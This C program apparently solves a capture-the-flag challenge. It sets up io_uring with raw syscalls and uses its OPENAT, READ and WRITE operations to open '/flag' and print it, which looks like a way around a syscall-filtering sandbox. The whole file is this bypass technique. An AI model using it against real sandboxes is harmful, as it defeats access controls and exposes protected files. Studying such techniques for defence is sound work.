#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <string.h>
#include <sys/syscall.h>
#include <linux/io_uring.h>
#include <fcntl.h>
#include <stdlib.h>
#include <stddef.h>

int main() {
    int ring_fd;
    struct io_uring_sqe *sqes;
    struct io_uring_cqe *cqes;

    uint32_t *sq_tail;
    uint32_t *cq_head;

    uint8_t rings_stack[4096] __attribute__((aligned(4096)));
    uint8_t sqes_stack[4096] __attribute__((aligned(4096)));

    memset(rings_stack, 0, 4096);
    memset(sqes_stack, 0, 4096);

    struct io_uring_params p = {0};
    char *p_ptr = (char *)&p;

    *((uint32_t*)(p_ptr + 0x0)) = 8;
    *((uint32_t*)(p_ptr + 0x4)) = 8;
    *((uint32_t*)(p_ptr + 0x8)) = 0x14000;
    *((uint64_t*)(p_ptr + 0x70)) = (uint64_t)rings_stack;
    *((uint64_t*)(p_ptr + 0x48)) = (uint64_t)sqes_stack;

    ring_fd = syscall(__NR_io_uring_setup, 8, &p);

    sqes = (struct io_uring_sqe *)sqes_stack;
    sq_tail = (uint32_t *)((char *)rings_stack + 4);            // p.sq_off.tail
    cqes = (struct io_uring_cqe *)((char *)rings_stack + 64);   // p.cq_off.cqes
    cq_head = (uint32_t *)((char *)rings_stack + 8);            // p.cq_off.head

    char path[] = "/flag";
    char buf[4096];

    struct io_uring_sqe sqe;
    memset(&sqe, 0, sizeof(sqe));
    char *sqe_ptr = (char *)&sqe;

    *((__u8 *)(sqe_ptr + 0)) = 18;                              // IORING_OP_OPENAT
    *((__s32 *)(sqe_ptr + 4)) = -100;                           // AT_FDCWD
    *((unsigned long *)(sqe_ptr + 16)) = (unsigned long)path;
    *((__u32 *)(sqe_ptr + 28)) = 0;                             // O_RDONLY;

    memcpy(&sqes[0], &sqe, sizeof(sqe));
    (*sq_tail)++;
    syscall(__NR_io_uring_enter, ring_fd, 1, 1, 1, NULL, 0);
    (*cq_head)++;

    int fd = cqes[0].res;
    printf("fd: %d\n", fd);

    memset(&sqe, 0, sizeof(sqe));
    *((__u8 *)(sqe_ptr + 0)) = 22;                              //IORING_OP_READ;
    *((__s32 *)(sqe_ptr + 4)) = fd;
    *((unsigned long *)(sqe_ptr + 16)) = (unsigned long)buf;
    *((unsigned long *)(sqe_ptr + 24)) = sizeof(buf);

    memcpy(&sqes[1], &sqe, sizeof(sqe));
    (*sq_tail)++;
    syscall(__NR_io_uring_enter, ring_fd, 1, 1, 1, NULL, 0);
    (*cq_head)++;

    int r = cqes[1].res;
    printf("read: %d\n", r);

    memset(&sqe, 0, sizeof(sqe));
    *((__u8 *)(sqe_ptr + 0)) = 23;                              // IORING_OP_WRITE;
    *((__s32 *)(sqe_ptr + 4)) = 1;
    *((unsigned long *)(sqe_ptr + 16)) = (unsigned long)buf;
    *((unsigned long *)(sqe_ptr + 24)) = r;

    memcpy(&sqes[2], &sqe, sizeof(sqe));
    (*sq_tail)++;
    syscall(__NR_io_uring_enter, ring_fd, 1, 1, 1, NULL, 0);
    (*cq_head)++;

    return 0;
}